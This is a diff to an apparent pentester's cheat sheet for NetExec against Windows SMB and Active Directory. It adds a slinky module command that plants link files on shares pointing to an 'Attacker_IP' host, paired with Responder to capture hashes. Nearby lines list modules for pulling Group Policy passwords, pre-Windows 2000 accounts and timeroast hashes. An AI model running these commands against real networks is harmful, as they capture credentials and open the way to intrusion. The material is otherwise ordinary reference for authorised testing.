@@ -69,6 +69,8 @@ nxc smb $IP  --users  --shares  --groups  --computers  --sessions  --rid-brute  
 ```bash
 nxc smb $ip -u '' -p ''
 
+-M slinky -o Name=0xmr SERVER=Attacker_IP SHARES=Share_Name   # You have stand with responder -I tun0 -dvw
+
 -M gpp_password             # Find passwords in Group Policy Preferences
 -M pre2k                    # Pre2K Active Directory misconfigurations (Password will same as the username itself)
 -M timeroast                # Request Hash of the computer Accounts via sntp Protocal without credentials Required.
